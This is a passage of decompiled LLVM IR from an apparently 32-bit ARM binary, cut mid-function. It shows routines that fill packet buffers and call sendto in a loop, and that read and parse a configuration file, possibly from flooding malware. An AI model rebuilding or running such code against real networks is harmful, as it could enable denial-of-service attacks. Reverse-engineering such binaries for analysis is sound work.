  %v3_e880 = add i32 %v2_e880, 11
  %v4_e880 = inttoptr i32 %v3_e880 to i8*
  store i8 %v1_e880, i8* %v4_e880, align 1
  %v3_e884 = load i32, i32* @r5, align 4
  %v4_e884 = add i32 %v3_e884, 10
  %v5_e884 = inttoptr i32 %v4_e884 to i8*
  store i8 %v3_e878, i8* %v5_e884, align 1
  %v0_e888 = load i32, i32* %r8.global-to-local, align 4
  %v1_e888 = trunc i32 %v0_e888 to i8
  %v2_e888 = load i32, i32* @r6, align 4
  %v3_e888 = add i32 %v2_e888, 6
  %v4_e888 = inttoptr i32 %v3_e888 to i8*
  store i8 %v1_e888, i8* %v4_e888, align 1
  %v0_e88c = load i32, i32* %r8.global-to-local, align 4
  %v1_e88c = trunc i32 %v0_e88c to i8
  %v2_e88c = load i32, i32* @r6, align 4
  %v3_e88c = add i32 %v2_e88c, 7
  %v4_e88c = inttoptr i32 %v3_e88c to i8*
  store i8 %v1_e88c, i8* %v4_e88c, align 1
  %v0_e890 = load i32, i32* @r5, align 4
  %v1_e890 = add i32 %v0_e890, 24
  %v2_e890 = inttoptr i32 %v1_e890 to i8*
  %v3_e890 = load i8, i8* %v2_e890, align 1
  %v4_e890 = zext i8 %v3_e890 to i32
  store i32 %v4_e890, i32* %r3.global-to-local, align 4
  %v1_e894 = add i32 %v0_e890, 25
  %v2_e894 = inttoptr i32 %v1_e894 to i8*
  %v3_e894 = load i8, i8* %v2_e894, align 1
  %v4_e894 = zext i8 %v3_e894 to i32
  %v4_e898 = mul nuw nsw i32 %v4_e894, 256
  %v5_e898 = or i32 %v4_e898, %v4_e890
  store i32 %v5_e898, i32* %r2.global-to-local, align 4
  %v3_e89c = load i32, i32* %stack_var_-44, align 4
  %v0_e8a0 = load i32, i32* @r6, align 4
  store i32 %v0_e8a0, i32* @r1, align 4
  %v1_e8a4 = add i32 %v3_e89c, 12
  store i32 %v1_e8a4, i32* %r3.global-to-local, align 4
  %v4_e8ac = call i32 @function_f1f8(i32 %v0_e890, i32 %v0_e8a0, i32 %v5_e898, i32 %v1_e8a4)
  %v5_e8ac = trunc i32 %v4_e8ac to i8
  %v4_e8b025 = udiv i32 %v4_e8ac, 256
  %v1_e8b4 = trunc i32 %v4_e8b025 to i8
  %v2_e8b4 = load i32, i32* @r6, align 4
  %v3_e8b4 = add i32 %v2_e8b4, 7
  %v4_e8b4 = inttoptr i32 %v3_e8b4 to i8*
  store i8 %v1_e8b4, i8* %v4_e8b4, align 1
  %v3_e8b8 = load i32, i32* @r6, align 4
  %v4_e8b8 = add i32 %v3_e8b8, 6
  %v5_e8b8 = inttoptr i32 %v4_e8b8 to i8*
  store i8 %v5_e8ac, i8* %v5_e8b8, align 1
  %v3_e8bc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e8bc, i32* %r3.global-to-local, align 4
  %v0_e8c0 = load i32, i32* @r5, align 4
  %v1_e8c0 = add i32 %v0_e8c0, 20
  %v2_e8c0 = inttoptr i32 %v1_e8c0 to i32*
  %v3_e8c0 = load i32, i32* %v2_e8c0, align 4
  %v5_e8c8 = mul i32 %v3_e8bc, 24
  %v1_e8cc = load i32, i32* @sl, align 4
  %v2_e8cc = add i32 %v1_e8cc, %v5_e8c8
  store i32 %v2_e8cc, i32* %ip.global-to-local, align 4
  %v3_e8d0 = udiv i32 %v3_e8c0, 65536
  store i32 %v3_e8d0, i32* %r2.global-to-local, align 4
  %v1_e8d4 = trunc i32 %v3_e8d0 to i8
  %v3_e8d4 = add i32 %v2_e8cc, 2
  %v4_e8d4 = inttoptr i32 %v3_e8d4 to i8*
  store i8 %v1_e8d4, i8* %v4_e8d4, align 1
  %v0_e8d8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e8d826 = udiv i32 %v0_e8d8, 256
  %v3_e8dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e8dc, i32* %r2.global-to-local, align 4
  %v1_e8e0 = trunc i32 %v3_e8d826 to i8
  %v2_e8e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_e8e0 = add i32 %v2_e8e0, 3
  %v4_e8e0 = inttoptr i32 %v3_e8e0 to i8*
  store i8 %v1_e8e0, i8* %v4_e8e0, align 1
  %v0_e8e4 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e8ec = load i32, i32* %r2.global-to-local, align 4
  %v1_e8ec = add i32 %v0_e8ec, 32
  store i32 %v1_e8ec, i32* %r2.global-to-local, align 4
  %v0_e8f0 = load i32, i32* %fp.global-to-local, align 4
  %v0_e8f8 = load i32, i32* %ip.global-to-local, align 4
  %v4_e8f8 = inttoptr i32 %v0_e8f8 to %sockaddr*
  %v7_e900 = inttoptr i32 %v0_e8e4 to i32*
  %v9_e900 = call i32 @sendto(i32 %v0_e8f0, i32* %v7_e900, i32 %v1_e8ec, i32 16384, %sockaddr* %v4_e8f8, i32 16)
  %v3_e904 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e904, i32* %r3.global-to-local, align 4
  %v1_e908 = add i32 %v3_e904, 1
  %v1_e90c = load i32, i32* %sb.global-to-local, align 4
  %v9_e90c = icmp eq i32 %v1_e908, %v1_e90c
  store i1 %v9_e90c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e908, i32* %stack_var_-40, align 4
  %v5_e914 = icmp slt i32 %v1_e908, %v1_e90c
  br i1 %v5_e914, label %dec_label_pc_e818, label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %dec_label_pc_e868
  %v2_e918 = icmp eq i32 %v1_e90c, 0
  store i1 %v2_e918, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e808.outer

dec_label_pc_e924:                                ; preds = %dec_label_pc_e818
  %v1_e924 = add i32 %v2_e820, 16
  %v2_e924 = inttoptr i32 %v1_e924 to i32*
  %v3_e924 = load i32, i32* %v2_e924, align 4
  store i32 %v3_e924, i32* @r4, align 4
  %v0_e928 = call i32 @function_10bd8()
  %v3_e92c = load i32, i32* %stack_var_-40, align 4
  %v5_e934 = mul i32 %v3_e92c, 24
  %v0_e938 = load i32, i32* @r4, align 4
  %v1_e93c = and i32 %v0_e938, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_e93c, i32* %r3.global-to-local, align 4
  %v1_e938 = udiv i32 %v0_e938, 256
  %v3_e940 = and i32 %v1_e938, 65280
  store i32 %v3_e940, i32* %r2.global-to-local, align 4
  %v1_e944 = load i32, i32* @sl, align 4
  %v2_e944 = add i32 %v1_e944, %v5_e934
  store i32 %v2_e944, i32* %ip.global-to-local, align 4
  %v3_e948 = mul i32 %v0_e938, 16777216
  %v4_e94c = mul i32 %v1_e93c, 256
  %v5_e94c = or i32 %v4_e94c, %v3_e948
  %v1_e950 = add i32 %v2_e944, 20
  %v2_e950 = inttoptr i32 %v1_e950 to i8*
  %v3_e950 = load i8, i8* %v2_e950, align 1
  %v4_e950 = zext i8 %v3_e950 to i32
  store i32 %v4_e950, i32* %lr.global-to-local, align 4
  %v4_e954 = udiv i32 %v0_e938, 16777216
  %v5_e954 = or i32 %v3_e940, %v4_e954
  %v2_e958 = or i32 %v5_e954, %v5_e94c
  %v7_e95c = lshr i32 %v0_e928, %v4_e950
  %v8_e95c = add i32 %v7_e95c, %v2_e958
  store i32 %v3_e670, i32* %r2.global-to-local, align 4
  %v2_e97c = call i32 @llvm.bswap.i32(i32 %v8_e95c)
  store i32 %v2_e97c, i32* %r3.global-to-local, align 4
  %v1_e980 = load i32, i32* %r7.global-to-local, align 4
  %v9_e980 = icmp eq i32 %v3_e670, %v1_e980
  store i1 %v9_e980, i1* %cpsr_z.global-to-local, align 1
  %v1_e984 = load i32, i32* @r5, align 4
  %v2_e984 = add i32 %v1_e984, 16
  %v3_e984 = inttoptr i32 %v2_e984 to i32*
  store i32 %v2_e97c, i32* %v3_e984, align 4
  br i1 %v9_e980, label %dec_label_pc_e98c, label %dec_label_pc_e924.dec_label_pc_e850_crit_edge

dec_label_pc_e924.dec_label_pc_e850_crit_edge:    ; preds = %dec_label_pc_e924
  %v1_e854.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e850

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e924, %dec_label_pc_e844
  %v0_e98c = call i32 @function_10bd8()
  %v1_e98c = trunc i32 %v0_e98c to i8
  %v4_e99027 = udiv i32 %v0_e98c, 256
  %v1_e994 = trunc i32 %v4_e99027 to i8
  %v2_e994 = load i32, i32* @r5, align 4
  %v3_e994 = add i32 %v2_e994, 5
  %v4_e994 = inttoptr i32 %v3_e994 to i8*
  store i8 %v1_e994, i8* %v4_e994, align 1
  store i32 %v3_e674, i32* %r3.global-to-local, align 4
  %v1_e99c = load i32, i32* %r7.global-to-local, align 4
  %v9_e99c = icmp eq i32 %v3_e674, %v1_e99c
  store i1 %v9_e99c, i1* %cpsr_z.global-to-local, align 1
  %v3_e9a0 = load i32, i32* @r5, align 4
  %v4_e9a0 = add i32 %v3_e9a0, 4
  %v5_e9a0 = inttoptr i32 %v4_e9a0 to i8*
  store i8 %v1_e98c, i8* %v5_e9a0, align 1
  %v0_e9a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e9a4, label %dec_label_pc_e9a8, label %dec_label_pc_e98c.dec_label_pc_e85c_crit_edge

dec_label_pc_e98c.dec_label_pc_e85c_crit_edge:    ; preds = %dec_label_pc_e98c
  %v1_e860.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e85c

dec_label_pc_e9a8:                                ; preds = %dec_label_pc_e98c, %dec_label_pc_e850
  %v0_e9a8 = call i32 @function_10bd8()
  %v1_e9a8 = trunc i32 %v0_e9a8 to i8
  %v4_e9b0 = sdiv i32 %v0_e9a8, 256
  store i32 %v4_e9b0, i32* %r3.global-to-local, align 4
  %v1_e9b4 = load i32, i32* %r7.global-to-local, align 4
  %v9_e9b4 = icmp eq i32 %v3_e678, %v1_e9b4
  store i1 %v9_e9b4, i1* %cpsr_z.global-to-local, align 1
  %v3_e9b8 = load i32, i32* @r5, align 4
  %v4_e9b8 = add i32 %v3_e9b8, 20
  %v5_e9b8 = inttoptr i32 %v4_e9b8 to i8*
  store i8 %v1_e9a8, i8* %v5_e9b8, align 1
  %v0_e9bc = load i32, i32* %r3.global-to-local, align 4
  %v1_e9bc = trunc i32 %v0_e9bc to i8
  %v2_e9bc = load i32, i32* @r6, align 4
  %v3_e9bc = add i32 %v2_e9bc, 1
  %v4_e9bc = inttoptr i32 %v3_e9bc to i8*
  store i8 %v1_e9bc, i8* %v4_e9bc, align 1
  %v0_e9c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e9c0, label %dec_label_pc_e9c4, label %dec_label_pc_e868

dec_label_pc_e9c4:                                ; preds = %dec_label_pc_e9a8, %dec_label_pc_e85c
  %v0_e9c4 = call i32 @function_10bd8()
  %v1_e9c4 = trunc i32 %v0_e9c4 to i8
  %v4_e9c8 = sdiv i32 %v0_e9c4, 256
  store i32 %v4_e9c8, i32* %r3.global-to-local, align 4
  %v1_e9cc = trunc i32 %v4_e9c8 to i8
  %v2_e9cc = load i32, i32* @r6, align 4
  %v3_e9cc = add i32 %v2_e9cc, 3
  %v4_e9cc = inttoptr i32 %v3_e9cc to i8*
  store i8 %v1_e9cc, i8* %v4_e9cc, align 1
  %v3_e9d0 = load i32, i32* @r6, align 4
  %v4_e9d0 = add i32 %v3_e9d0, 2
  %v5_e9d0 = inttoptr i32 %v4_e9d0 to i8*
  store i8 %v1_e9c4, i8* %v5_e9d0, align 1
  br label %dec_label_pc_e868

dec_label_pc_e9d8:                                ; preds = %dec_label_pc_e638
  %v0_e9d8 = load i32, i32* %fp.global-to-local, align 4
  %v1_e9dc = call i32 @close(i32 %v0_e9d8)
  br label %dec_label_pc_e9e0

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e528, %dec_label_pc_e9d8
  %v29_e9e4 = phi i32 [ %v3_e628, %dec_label_pc_e528 ], [ %v1_e9dc, %dec_label_pc_e9d8 ]
  store i32 %v3_e528, i32* %r4.global-to-local, align 4
  store i32 %v6_e528, i32* %r5.global-to-local, align 4
  store i32 %v9_e528, i32* %r6.global-to-local, align 4
  store i32 %v12_e528, i32* %r7.global-to-local, align 4
  ret i32 %v29_e9e4

; uselistorder directives
  uselistorder i32 %v4_e9c8, { 1, 0 }
  uselistorder i32 %v2_e97c, { 1, 0 }
  uselistorder i32 %v0_e938, { 1, 0, 2, 3 }
  uselistorder i1 %v2_e918, { 1, 0 }
  uselistorder i32 %v1_e90c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_e908, { 2, 0, 3, 1 }
  uselistorder i32 %v3_e8d0, { 1, 0 }
  uselistorder i32 %v4_e87c, { 1, 0 }
  uselistorder i1 %v3_e848, { 1, 0 }
  uselistorder i32 %v1_e7f0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e794, { 1, 0 }
  uselistorder i32 %v1_e71c, { 1, 0 }
  uselistorder i32 %v1_e6a4, { 1, 0 }
  uselistorder i32 %v1_e698, { 1, 0 }
  uselistorder i32 %v0_e668, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_e660, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_e658, { 1, 0 }
  uselistorder i1 %v7_e62c, { 1, 0 }
  uselistorder i32 %v3_e628, { 1, 2, 0 }
  uselistorder i32 %v1_e5c8, { 1, 0 }
  uselistorder i8 %v5_e5b8, { 1, 0 }
  uselistorder i32 %v5_e59c, { 1, 0 }
  uselistorder i32 %v6_e560, { 1, 0 }
  uselistorder i32 %v1_e52c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 12, 11 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 5, 3, 1, 4, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 -8, { 0, 2, 1, 3, 4 }
  uselistorder i32 and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960), { 6, 7, 0, 8, 1, 9, 2, 3, 10, 11, 12, 4, 5 }
  uselistorder label %dec_label_pc_e9e0, { 1, 0 }
  uselistorder label %dec_label_pc_e868, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e808, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_e9ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e9ec:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_e9ec = load i32, i32* @r4, align 4
  %v6_e9ec = load i32, i32* @r5, align 4
  %v9_e9ec = load i32, i32* @r6, align 4
  %v12_e9ec = load i32, i32* @r7, align 4
  %v15_e9ec = load i32, i32* @r8, align 4
  %v18_e9ec = load i32, i32* @sb, align 4
  %v21_e9ec = load i32, i32* @sl, align 4
  %v24_e9ec = load i32, i32* @fp, align 4
  %v1_e9f8 = urem i32 %arg1, 256
  store i32 %v1_e9f8, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ea04 = urem i32 %arg3, 256
  store i32 %v1_ea04, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_ea10 = call i32 @_calloc(i32 %v1_e9f8, i32 4)
  %v0_ea14 = load i32, i32* @r5, align 4
  store i32 %v0_ea14, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ea20 = load i32, i32* @r4, align 4
  store i32 %v0_ea20, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_ea28 = inttoptr i32 %v0_ea14 to i32*
  %v6_ea28 = call i32 @function_b240(i32 %v0_ea20, i32* %v5_ea28, i32 2, i32 0)
  %v1_ea34 = urem i32 %v6_ea28, 256
  store i32 %v1_ea34, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ea40 = load i32, i32* @r4, align 4
  store i32 %v0_ea40, i32* %r0.global-to-local, align 4
  %v0_ea44 = load i32, i32* @r5, align 4
  store i32 %v0_ea44, i32* %r1.global-to-local, align 4
  %v5_ea48 = trunc i32 %v6_ea28 to i8
  %v6_ea4c = inttoptr i32 %v0_ea44 to i32*
  %v7_ea4c = call i32 @function_b240(i32 %v0_ea40, i32* %v6_ea4c, i32 3, i32 65535)
  %v0_ea50 = load i32, i32* @r5, align 4
  store i32 %v0_ea50, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_ea5c = load i32, i32* @r4, align 4
  store i32 %v0_ea5c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_ea64 = inttoptr i32 %v0_ea50 to i32*
  %v6_ea64 = call i32 @function_b240(i32 %v0_ea5c, i32* %v5_ea64, i32 4, i32 64)
  %v1_ea6c = urem i32 %v6_ea64, 256
  store i32 %v1_ea6c, i32* %ip.global-to-local, align 4
  %v0_ea70 = load i32, i32* @r5, align 4
  store i32 %v0_ea70, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ea7c = load i32, i32* @r4, align 4
  store i32 %v0_ea7c, i32* %r0.global-to-local, align 4
  %v6_ea84 = inttoptr i32 %v0_ea70 to i32*
  %v7_ea84 = call i32 @function_b240(i32 %v0_ea7c, i32* %v6_ea84, i32 5, i32 0)
  %v1_ea90 = urem i32 %v7_ea84, 256
  store i32 %v1_ea90, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_ea9c = load i32, i32* @r4, align 4
  store i32 %v0_ea9c, i32* %r0.global-to-local, align 4
  %v0_eaa0 = load i32, i32* @r5, align 4
  store i32 %v0_eaa0, i32* %r1.global-to-local, align 4
  %v5_eaa8 = inttoptr i32 %v0_eaa0 to i32*
  %v6_eaa8 = call i32 @function_b240(i32 %v0_ea9c, i32* %v5_eaa8, i32 6, i32 65535)
  %v0_eaac = load i32, i32* @r5, align 4
  store i32 %v0_eaac, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_eaa8, i32* %fp.global-to-local, align 4
  %v0_eabc = load i32, i32* @r4, align 4
  store i32 %v0_eabc, i32* %r0.global-to-local, align 4
  %v4_eac0 = inttoptr i32 %v0_eaac to i32*
  %v5_eac0 = call i32 @function_b240(i32 %v0_eabc, i32* %v4_eac0, i32 7, i32 53)
  %v0_eac8 = load i32, i32* @r5, align 4
  store i32 %v0_eac8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v5_eac0, i32* %sb.global-to-local, align 4
  %v0_ead8 = load i32, i32* @r4, align 4
  store i32 %v0_ead8, i32* %r0.global-to-local, align 4
  %v4_eadc = inttoptr i32 %v0_eac8 to i32*
  %v5_eadc = call i32 @function_b240(i32 %v0_ead8, i32* %v4_eadc, i32 9, i32 65535)
  %v0_eae0 = load i32, i32* @r5, align 4
  store i32 %v0_eae0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_eadc, i32* @sl, align 4
  %v0_eaf0 = load i32, i32* @r4, align 4
  store i32 %v0_eaf0, i32* %r0.global-to-local, align 4
  %v4_eaf4 = inttoptr i32 %v0_eae0 to i32*
  %v5_eaf4 = call i32 @function_b240(i32 %v0_eaf0, i32* %v4_eaf4, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_eb00 = load i32, i32* @r5, align 4
  store i32 %v0_eb00, i32* %r1.global-to-local, align 4
  store i32 %v5_eaf4, i32* %r8.global-to-local, align 4
  %v0_eb08 = load i32, i32* @r4, align 4
  store i32 %v0_eb08, i32* %r0.global-to-local, align 4
  %v5_eb0c = inttoptr i32 %v0_eb00 to i32*
  %v6_eb0c = call i32 @function_acdc(i32 %v0_eb08, i32* %v5_eb0c, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_eb18 = call i32 @function_13128(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_eb24 = call i32 @function_13044(i32 30, i32* null)
  %v4_eb24 = inttoptr i32 %v3_eb24 to i8*
  store i32 %v3_eb24, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_eb2c = call i32 (i8*, i32, ...) @open(i8* %v4_eb24, i32 0)
  store i32 %v4_eb2c, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_eb38 = call i32 @function_13070(i32 30)
  store i32 %v1_eb38, i32* %r0.global-to-local, align 4
  %v0_eb3c = load i32, i32* @r4, align 4
  %v1_eb3c = icmp slt i32 %v0_eb3c, 0
  %v2_eb3c = icmp eq i32 %v0_eb3c, 0
  store i1 %v2_eb3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_eb3c, label %dec_label_pc_f108, label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %dec_label_pc_e9ec
  %v2_eb48 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_eb48, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_eb48, i32* %r1.global-to-local, align 4
  store i32 %v0_eb3c, i32* %r0.global-to-local, align 4
  %v4_eb58 = call i32 @read(i32 %v0_eb3c, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_eb58, i32* @r5, align 4
  %v0_eb60 = load i32, i32* @r4, align 4
  store i32 %v0_eb60, i32* %r0.global-to-local, align 4
  %v1_eb64 = call i32 @close(i32 %v0_eb60)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_eb6c = call i32 @function_13128(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_eb78 = call i32 @function_13044(i32 31, i32* null)
  %v0_eb7c = load i32, i32* @r5, align 4
  store i32 %v0_eb7c, i32* @r1, align 4
  store i32 %v3_eb78, i32* %r2.global-to-local, align 4
  store i32 %v2_eb48, i32* %r0.global-to-local, align 4
  %v3_eb88 = bitcast i32* %stack_var_-2120 to i8*
  %v4_eb88 = call i32 @function_13da8(i8* %v3_eb88, i32 %v0_eb7c, i32 %v3_eb78)
  store i32 %v4_eb88, i32* @r4, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_eb94 = call i32 @function_13070(i32 31)
  store i32 %v1_eb94, i32* %r0.global-to-local, align 4
  %v0_eb98 = load i32, i32* @r4, align 4
  %v7_eb98 = icmp eq i32 %v0_eb98, -1
  store i1 %v7_eb98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb98, label %dec_label_pc_f108, label %dec_label_pc_eba0

dec_label_pc_eba0:                                ; preds = %dec_label_pc_eb44
  %v0_eba0 = load i32, i32* @r5, align 4
  %v9_eba0 = icmp eq i32 %v0_eba0, %v0_eb98
  store i1 %v9_eba0, i1* %cpsr_z.global-to-local, align 1
  %v7_eba4 = icmp sgt i32 %v0_eba0, %v0_eb98
  br i1 %v7_eba4, label %dec_label_pc_eba8, label %dec_label_pc_f108

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eba0
  store i32 %v0_eba0, i32* %r3.global-to-local, align 4
  store i32 %v0_eb98, i32* %r2.global-to-local, align 4
  %v0_ebb8 = load i32, i32* @r6, align 4
  %v2_ebb8 = add i32 %v0_ebb8, %v0_eb98
  store i32 %v2_ebb8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_ebc0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_ebc0, i32* %r7.global-to-local, align 4
  %v1_ebf0 = add i32 %v0_eba0, -1
  br label %dec_label_pc_ebe8

dec_label_pc_ebcc:                                ; preds = %dec_label_pc_ec10, %bb139
  %v9_ebcc = icmp eq i32 %v0_ebd8, %v1_ebf0
  store i1 %v9_ebcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebcc, label %dec_label_pc_ec1c, label %dec_label_pc_ebd4

dec_label_pc_ebd4:                                ; preds = %dec_label_pc_ec00, %dec_label_pc_ebcc, %bb
  %v0_ec0c43 = phi i32 [ %v0_ec0c, %dec_label_pc_ec00 ], [ %v0_ec0c44, %dec_label_pc_ebcc ], [ %v0_ec0c, %bb ]
  %v0_ebec39 = phi i32 [ 0, %dec_label_pc_ec00 ], [ %v0_ebec40, %dec_label_pc_ebcc ], [ 0, %bb ]
  store i32 %v0_eba0, i32* %r0.global-to-local, align 4
  %v1_ebd8 = add i32 %v0_ebd8, 1
  store i32 %v1_ebd8, i32* %r2.global-to-local, align 4
  %v9_ebdc = icmp eq i32 %v0_eba0, %v1_ebd8
  store i1 %v9_ebdc, i1* %cpsr_z.global-to-local, align 1
  %v1_ebe0 = add i32 %v0_ebe0, 1
  store i32 %v1_ebe0, i32* %r7.global-to-local, align 4
  br i1 %v9_ebdc, label %dec_label_pc_f108, label %dec_label_pc_ebe8

dec_label_pc_ebe8:                                ; preds = %dec_label_pc_ebd4, %dec_label_pc_eba8
  %v0_ebe0 = phi i32 [ %v1_ebe0, %dec_label_pc_ebd4 ], [ %v2_ebc0, %dec_label_pc_eba8 ]
  %v0_ebd8 = phi i32 [ %v1_ebd8, %dec_label_pc_ebd4 ], [ %v0_eb98, %dec_label_pc_eba8 ]
  %v0_ec0c = phi i32 [ %v0_ec0c43, %dec_label_pc_ebd4 ], [ 0, %dec_label_pc_eba8 ]
  %v0_ebec = phi i32 [ %v0_ebec39, %dec_label_pc_ebd4 ], [ 0, %dec_label_pc_eba8 ]
  %v0_ebf4 = phi i32 [ %v1_ebf4, %dec_label_pc_ebd4 ], [ %v2_ebb8, %dec_label_pc_eba8 ]
  %v1_ebe8 = inttoptr i32 %v0_ebf4 to i8*
  %v2_ebe8 = load i8, i8* %v1_ebe8, align 1
  %v3_ebe8 = zext i8 %v2_ebe8 to i32
  store i32 %v3_ebe8, i32* %r3.global-to-local, align 4
  %v2_ebec = icmp eq i32 %v0_ebec, 0
  store i1 %v2_ebec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ebf0, i32* %ip.global-to-local, align 4
  %v1_ebf4 = add i32 %v0_ebf4, 1
  store i32 %v1_ebf4, i32* %r1.global-to-local, align 4
  %v1_ebf8 = add nsw i32 %v3_ebe8, -48
  store i32 %v1_ebf8, i32* %r0.global-to-local, align 4
  br i1 %v2_ebec, label %dec_label_pc_ec00, label %dec_label_pc_ec10

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebe8
  %v7_ec00 = icmp eq i8 %v2_ebe8, 9
  store i1 %v7_ec00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec00, label %dec_label_pc_ebd4, label %bb

bb:                                               ; preds = %dec_label_pc_ec00
  %v8_ec04 = icmp eq i8 %v2_ebe8, 32
  store i1 %v8_ec04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ec04, label %dec_label_pc_ebd4, label %dec_label_pc_ec0c

dec_label_pc_ec0c:                                ; preds = %bb
  %v1_ec0c = add i32 %v0_ec0c, 1
  store i32 %v1_ec0c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_ec10

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ebe8, %dec_label_pc_ec0c
  %v0_ec0c44 = phi i32 [ %v0_ec0c, %dec_label_pc_ebe8 ], [ %v1_ec0c, %dec_label_pc_ec0c ]
  %v0_ebec40 = phi i32 [ %v0_ebec, %dec_label_pc_ebe8 ], [ %v1_ec0c, %dec_label_pc_ec0c ]
